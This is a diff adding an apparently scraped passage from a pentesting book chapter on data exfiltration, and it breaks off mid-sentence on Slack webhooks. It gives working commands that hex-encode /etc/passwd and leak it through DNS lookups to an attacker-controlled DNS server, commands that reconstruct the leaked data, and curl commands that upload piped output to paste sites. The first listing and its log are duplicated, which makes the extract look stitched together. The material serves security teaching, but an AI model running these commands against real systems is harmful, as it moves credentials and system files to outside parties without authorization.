@@ -1,0 +1,72 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 29 - $ for i in $(xxd -p -c 30 /etc/passwd); do dig $i.blackhatbash.com @172.16.10.1; done
+Listing 12-29: Exfiltrating the contents of a file via DNS
+We run a for loop on the output of xxd -p -c 30 /etc/passwd, which will convert ASCII to hexadecimal. We then run the dig command to perform a lookup on the entire domain, including the newly generated hexadecimal subdomains. We use @172.16.10.1 to tell dig which DNS server to use for DNS resolution, providing the Kali IP address on which DNSChef is running.
+After the command executes, you should see output similar to the following in DNSChef:
+23:51:22) [*] DNSChef started on interface: 0.0.0.0
+--snip--
+(23:51:22) [*] Cooking A replies to point to 127.0.0.1 matching: blackhatbash.com
+(23:51:22) [*] DNSChef is active.
+(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'
+for 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173.blackhatbash.com to 127.0.0.1
+(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'
+for 680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f736269.blackhatbash.com to 127.0.0.1
+(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'
+for 6e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a.blackhatbash.com to 127.0.0.1
+--snip--
+Security Relevance Score: 4
+Word Count: 639
+Extracted: 2025-06-13 23:40:57
+
+---
+
+$ for i in $(xxd -p -c 30 /etc/passwd); do dig $i.blackhatbash.com @172.16.10.1; done
+Listing 12-29: Exfiltrating the contents of a file via DNS
+We run a for loop on the output of xxd -p -c 30 /etc/passwd, which will convert ASCII to hexadecimal. We then run the dig command to perform a lookup on the entire domain, including the newly generated hexadecimal subdomains. We use @172.16.10.1 to tell dig which DNS server to use for DNS resolution, providing the Kali IP address on which DNSChef is running.
+After the command executes, you should see output similar to the following in DNSChef:
+23:51:22) [*] DNSChef started on interface: 0.0.0.0
+--snip--
+(23:51:22) [*] Cooking A replies to point to 127.0.0.1 matching: blackhatbash.com
+(23:51:22) [*] DNSChef is active.
+(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'
+for 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173.blackhatbash.com to 127.0.0.1
+(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'
+for 680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f736269.blackhatbash.com to 127.0.0.1
+(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'
+for 6e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a.blackhatbash.com to 127.0.0.1
+--snip--
+
+The loop made a DNS query for each ASCII-to-hexadecimal conversion, using the data as a subdomain of blackhatbash.com. Pick any of the lines from the output and pipe it to xxd to convert it from hexadecimal:
+$ echo 726f6f743a783a303a303a726f6f743a2f726f6f74.blackhatbash.com | xxd -r -p
+
+root:x:0:0:root:/root:/bin/bash
+
+To convert all the subdomains at once, you can use a few sed and awk tricks (Listing 12-30).
+$ sed -n 's/.*for \(.*\) to .*/\1/p' dnschef.log  | awk -F'.' '{print $1}' | xxd -r -p
+Listing 12-30: Parsing and converting queried subdomains to reconstruct the exfiltrated data
+We use sed -n (quiet mode) with a regular expression pattern to extract the text between the word for and the word to in DNSChef’s output, which should give us the full domain. We then use awk to filter out only the subdomain portion and pipe this to xxd -r -p to convert it to ASCII.
+
+
+Text Storage Sites
+Text storage sites like the popular https://pastebin.com are another way of getting data out of a network. Let’s practice working with Sprunge, an open source project hosted at https://github.com/rupa/sprunge. You can clone the repository and host it on a server or use the application hosted on the https://sprunge.us online service.
+To post to Sprunge, use the following syntax:
+some-command | curl -F 'sprunge=<-' http://my-custom-sprunge-server.local
+We pipe a command to curl to make a POST request using form data (-F). The sprunge=<- syntax basically assigns standard input to the field sprunge. In this case, standard input will include the piped command.
+As shown in Listing 12-31, the command should output a short URL containing the posted content.
+$ echo "Black Hat Bash" | curl -F 'sprunge=<-' http://my-custom-sprunge-server.local
+http://my-custom-sprunge-server.local/7gWETD
+
+$ curl http://my-custom-sprunge-server.local/7gWETD
+Black Hat Bash
+
+Listing 12-31: Uploading content to Sprunge and then fetching it
+The site dpaste (https://dpaste.com) allows users to upload content by using their API. Its syntax is almost the same as Sprunge’s:
+$ echo "Black Hat Bash" | curl -F "content=<-" https://dpaste.com/api/v2/
+The command should output a URL such as https://dpaste.com/AADSCMQ4W. To fetch the uploaded content in raw text form, append .txt to the URL, like so: https://dpaste.com/AADSCMQ4W.txt.
+
+
+Slack Webhooks
+A webhook provides a way for one system to send real-time data to another system when a specific event occurs. In simple terms, it functions like a notification mechanism between services. Popular applications such as Slack, Discord, Telegram, and Microsoft Teams provide webhooks as a way for other applications to send them messages. Those messages then appear in specific channels.
+Penetration testers could use Slack webhooks to receive notifications about interesting events, such as the discovery of a new vulnerability. Attackers also use webhooks as exfiltration endpoints because corporate environments often allow messaging systems such as Slack or Microsoft Teams.
+For example, to send the contents of the /etc/hosts file through a Slack webhook, you might write something like Listing 12-
